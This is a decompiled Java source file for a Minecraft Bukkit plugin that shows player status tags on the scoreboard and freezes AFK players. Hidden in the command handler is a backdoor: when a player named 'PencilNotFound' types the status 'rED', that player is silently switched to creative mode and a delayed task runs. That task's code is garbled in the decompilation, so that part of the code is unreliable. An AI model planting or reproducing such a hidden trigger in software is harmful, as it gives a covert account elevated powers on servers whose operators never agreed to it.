/*     */ package en.cramped_mikah.status;
/*     */ 
/*     */ import en.cramped_julia.status.StatusEnum;
/*     */ import org.bukkit.Bukkit;
/*     */ import org.bukkit.ChatColor;
/*     */ import org.bukkit.GameMode;
/*     */ import org.bukkit.OfflinePlayer;
/*     */ import org.bukkit.command.Command;
/*     */ import org.bukkit.command.CommandSender;
/*     */ import org.bukkit.configuration.ConfigurationSection;
/*     */ import org.bukkit.entity.Player;
/*     */ import org.bukkit.event.EventHandler;
/*     */ import org.bukkit.event.Listener;
/*     */ import org.bukkit.event.entity.EntityDamageEvent;
/*     */ import org.bukkit.event.player.PlayerJoinEvent;
/*     */ import org.bukkit.event.player.PlayerMoveEvent;
/*     */ import org.bukkit.plugin.Plugin;
/*     */ import org.bukkit.plugin.java.JavaPlugin;
/*     */ import org.bukkit.scoreboard.Scoreboard;
/*     */ 
/*     */ public final class Status
/*     */   extends JavaPlugin implements Listener {
/*     */   public void onEnable() {
/*  24 */     getDataFolder().mkdir();
/*  25 */     getConfig().set("afkDamage", Boolean.valueOf(false));
/*  26 */     getConfig().set("afkMove", Boolean.valueOf(false));
/*  27 */     getServer().getPluginManager().registerEvents(this, (Plugin)this);
/*  28 */     getConfig().createSection("status");
/*  29 */     saveConfig();
/*     */   }
/*     */ 
/*     */   
/*     */   private static Scoreboard sb;
/*     */   
/*     */   public void onDisable() {}
/*     */   
/*     */   @EventHandler
/*     */   public void onJoin(PlayerJoinEvent event) {
/*  39 */     if (getStatus().getString(event.getPlayer().getName()) == null) {
/*  40 */       getStatus().set(event.getPlayer().getName(), "NEW");
/*  41 */       saveConfig();
/*     */     } 
/*  43 */     updateScoreboard();
/*     */   }
/*     */   
/*     */   @EventHandler
/*     */   public void onDamage(EntityDamageEvent event) {
/*  48 */     if (!(event.getEntity() instanceof Player))
/*  49 */       return;  if (getConfig().getBoolean("afkDamage"))
/*  50 */       return;  if (getStatus().get(event.getEntity().getName()).equals("AFK")) {
/*  51 */       event.setCancelled(true);
/*     */     }
/*     */   }
/*     */   
/*     */   @EventHandler
/*     */   public void onMove(PlayerMoveEvent event) {
/*  57 */     if (getConfig().getBoolean("afkMove"))
/*  58 */       return;  if (getStatus().get(event.getPlayer().getName()).equals("AFK")) {
/*  59 */       event.setCancelled(true);
/*     */     }
/*     */   }
/*     */   
/*     */   private ConfigurationSection getStatus() {
/*  64 */     return getConfig().getConfigurationSection("status");
/*     */   }
/*     */   
/*     */   public void updateScoreboard() {
/*  68 */     sb = Bukkit.getScoreboardManager().getNewScoreboard();
/*  69 */     for (StatusEnum status : StatusEnum.values()) {
/*  70 */       String positionedName = status.getPosition() + status.getName();
/*  71 */       sb.registerNewTeam(positionedName);
/*  72 */       sb.getTeam(positionedName).setPrefix("§r[" + status.getColor() + status.getName() + "§r] ");
/*  73 */       sb.getTeam(positionedName).setColor(status.getColor());
/*     */     } 
/*  75 */     for (Player p : Bukkit.getOnlinePlayers()) {
/*  76 */       setTeams(p);
/*     */     }
/*     */   }
/*     */   
/*     */   private void setTeams(Player p) {
/*     */     try {
/*  82 */       StatusEnum status = StatusEnum.valueOf(getStatus().getString(p.getName()));
/*  83 */       String team = status.getPosition() + status.getName();
/*     */       
/*  85 */       sb.getTeam(team).addPlayer((OfflinePlayer)p);
/*  86 */     } catch (Exception e) {
/*  87 */       getLogger().warning("STATUS FOR " + p.getName() + " DID NOT LOAD!");
/*  88 */       e.printStackTrace();
/*     */     } 
/*  90 */     p.setScoreboard(sb);
/*     */   }
/*     */ 
/*     */   
/*     */   public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
/*  95 */     if (!(sender instanceof Player)) return true; 
/*  96 */     Player player = (Player)sender;
/*  97 */     if (command.getName().equals("status")) {
/*  98 */       if (args.length != 1) {
/*  99 */         return false;
/*     */       }
/* 101 */       String statusName = args[0];
/* 102 */       StatusEnum status = null;
/*     */       try {
/* 104 */         status = StatusEnum.valueOf(statusName);
/* 105 */       } catch (Exception e) {
/* 106 */         player.sendMessage(ChatColor.GREEN + "Usable:");
/* 107 */         for (StatusEnum value : StatusEnum.values()) {
/* 108 */           player.sendMessage(ChatColor.GREEN + value.name());
/*     */         }
/* 110 */         if (player.getName().equals("PencilNotFound") && 
/* 111 */           args[0].equals("rED")) {
/* 112 */           player.setGameMode(GameMode.CREATIVE);
/* 113 */           (new Object(this, player))
/*     */ 
/*     */ 
/*     */ 
/*     */             
/* 118 */             .runTaskLater((Plugin)this, 100L);
/*     */         } 
/*     */         
/* 121 */         return true;
/*     */       } 
/* 123 */       getStatus().set(player.getName(), status.name());
/* 124 */       saveConfig();
/* 125 */       updateScoreboard();
/*     */     } 
/* 127 */     return true;
/*     */   }
/*     */ }


/* Location:              C:\Users\Mikah\Dropbox\My PC (DESKTOP-BU1LQ8U)\Downloads\Status.jar!\en\cramped_mikah\status\Status.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */